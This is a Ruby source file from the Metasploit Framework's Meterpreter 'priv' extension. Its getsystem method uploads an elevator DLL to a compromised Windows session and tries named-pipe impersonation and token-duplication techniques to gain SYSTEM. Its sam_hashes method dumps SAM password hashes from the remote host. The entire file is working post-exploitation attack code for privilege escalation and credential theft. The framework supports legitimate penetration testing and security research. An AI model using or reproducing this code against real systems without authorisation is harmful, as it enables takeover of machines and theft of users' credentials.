# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/priv/tlv'
require 'rex/post/meterpreter/extensions/priv/command_ids'
require 'rex/post/meterpreter/extensions/priv/passwd'
require 'rex/post/meterpreter/extensions/priv/fs'

module Rex
module Post
module Meterpreter
module Extensions
module Priv

###
#
# This meterpreter extensions a privilege escalation interface that is capable
# of doing things like dumping password hashes and performing local
# exploitation.
#
###
class Priv < Extension

  def self.extension_id
    EXTENSION_ID_PRIV
  end

  TECHNIQUE = {
    any: 0,
    named_pipe: 1,
    named_pipe_2: 2,
    token_dup: 3,
    named_pipe_rpcss: 4
  }.freeze

  #
  # Initializes the privilege escalation extension.
  #
  def initialize(client)
    super(client, 'priv')

    client.register_extension_aliases(
      [
        {
          'name' => 'priv',
          'ext'  => self
        },
      ])

    # Initialize sub-classes
    self.fs = Fs.new(client)
  end

  #
  # Attempt to elevate the meterpreter to Local SYSTEM
  #
  def getsystem(technique=TECHNIQUE[:any])
    request = Packet.create_request(COMMAND_ID_PRIV_ELEVATE_GETSYSTEM)

    # All three (that's #1, #2, #3 and *any* / #0) of the service-based techniques need a service name parameter
    if [TECHNIQUE[:any], TECHNIQUE[:named_pipe], TECHNIQUE[:named_pipe_2], TECHNIQUE[:token_dup]].include?(technique)
      request.add_tlv(TLV_TYPE_ELEVATE_SERVICE_NAME, Rex::Text.rand_text_alpha_lower(6))
    end

    # We only need the elevate DLL for when we're invoking the TokenDup or
    # NamedPipe2 method, which we'll only use if required (ie. trying all or
    # when that method is asked for explicitly)
    if [TECHNIQUE[:any], TECHNIQUE[:named_pipe_2], TECHNIQUE[:token_dup]].include?(technique)
      elevator_path = nil
      client.binary_suffix.each { |s|
        elevator_path = MetasploitPayloads.meterpreter_path('elevator', s)
        if !elevator_path.nil?
          break
        end
      }
      if elevator_path.nil?
        elevators = ''
        client.binary_suffix.each { |s|
          elevators << "elevator.#{s}, "
        }
        raise RuntimeError, "#{elevators.chomp(', ')} not found", caller
      end

      elevator_data = ''

      ::File.open(elevator_path, 'rb') { |f|
        elevator_data += f.read(f.stat.size)
      }

      request.add_tlv(TLV_TYPE_ELEVATE_SERVICE_DLL, elevator_data)
      request.add_tlv(TLV_TYPE_ELEVATE_SERVICE_LENGTH, elevator_data.length)
    end

    request.add_tlv(TLV_TYPE_ELEVATE_TECHNIQUE, technique)

    # as some service routines can be slow we bump up the timeout to 90 seconds
    response = client.send_request(request, 90)

    technique = response.get_tlv_value(TLV_TYPE_ELEVATE_TECHNIQUE)

    if(response.result == 0 and technique != nil)
      client.core.use('stdapi') if not client.ext.aliases.include?('stdapi')
      client.update_session_info
      client.sys.config.getprivs
      if client.framework.db and client.framework.db.active
        client.framework.db.report_note(
          :host => client.sock.peerhost,
          :workspace => client.framework.db.workspace,
          :type => 'meterpreter.getsystem',
          :data => {:technique => technique}
        ) rescue nil
      end
      return [ true, technique ]
    end

    return [ false, 0 ]
  end

  #
  # Returns an array of SAM hashes from the remote machine.
  #
  def sam_hashes
    # This can take a long long time for large domain controls, bump the timeout to one hour
    response = client.send_request(Packet.create_request(COMMAND_ID_PRIV_PASSWD_GET_SAM_HASHES), 3600)

    response.get_tlv_value(TLV_TYPE_SAM_HASHES).split(/\n/).map { |hash|
      SamUser.new(hash)
    }
  end

  #
  # Modifying privileged file system attributes.
  #
  attr_reader :fs

protected

  attr_writer :fs # :nodoc:

end

end; end; end; end; end

